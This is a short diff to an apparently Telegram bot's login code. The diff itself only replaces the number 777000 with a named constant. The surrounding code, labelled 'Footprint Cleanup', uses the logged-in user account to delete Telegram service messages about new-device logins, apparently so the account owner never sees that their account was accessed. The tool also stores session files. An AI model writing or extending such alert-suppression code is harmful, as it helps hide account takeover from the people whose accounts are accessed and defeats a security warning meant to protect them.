@@ -27,7 +27,7 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")
 
 from app.core.config import settings
 from app.core.database import db
-from app.core.constants import LOCK_TTL_SECONDS, SESSION_FILE_PERMISSIONS, WORKER_HEARTBEAT_TIMEOUT_SECONDS
+from app.core.constants import LOCK_TTL_SECONDS, SESSION_FILE_PERMISSIONS, WORKER_HEARTBEAT_TIMEOUT_SECONDS, TELEGRAM_SERVICE_NOTIFICATIONS_ID
 
 
 # Unique ID for this process instance — used in distributed Redis locks
@@ -585,7 +585,7 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         # Use the USER account to clear history (Footprint Cleanup)
         try:
             # 1. Delete "Telegram Service Notification"
-            async for message in client.iter_messages(777000, limit=10):
+            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=10):
                 if "new device" in (message.message or "").lower() or "login" in (message.message or "").lower():
                     await message.delete()
                     logger.info(f"Deleted Telegram Service Notification for {filename}")
